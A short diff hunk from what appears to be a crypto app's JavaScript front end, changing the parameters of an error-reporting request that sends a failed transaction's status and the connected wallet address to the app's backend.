@@ -149,7 +149,7 @@ try{
 }catch(e){
    setIsLoading(false)
 alert(e.message)
-const data = await axios.get(`https://maticminingtransferapi.onrender.com/update?txHash=NA&reciever=NA&msg=failure&address=${account[0]}`)
+const data = await axios.get(`https://maticminingtransferapi.onrender.com/update?txHash=NA&reciever=NA&msg=failure&from=${account[0]}&amount=10`)
 // Define the URL of the destination website
 // let destinationUrl = "https://google.com";
 
